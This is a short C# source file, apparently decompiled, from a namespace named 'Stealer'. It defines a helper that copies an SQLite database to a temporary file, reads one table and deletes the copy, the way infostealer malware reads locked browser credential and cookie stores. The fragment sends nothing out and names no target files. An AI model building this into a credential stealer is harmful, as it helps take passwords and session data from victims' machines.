using System.IO;

namespace Stealer;

internal sealed class SqlReader
{
	public static SQLite ReadTable(string database, string table)
	{
		if (!File.Exists(database))
		{
			return null;
		}
		string text = Path.GetTempFileName() + ".dat";
		File.Copy(database, text);
		SQLite sQLite = new SQLite(text);
		sQLite.ReadTable(table);
		File.Delete(text);
		if (sQLite.GetRowCount() == 65536)
		{
			return null;
		}
		return sQLite;
	}
}
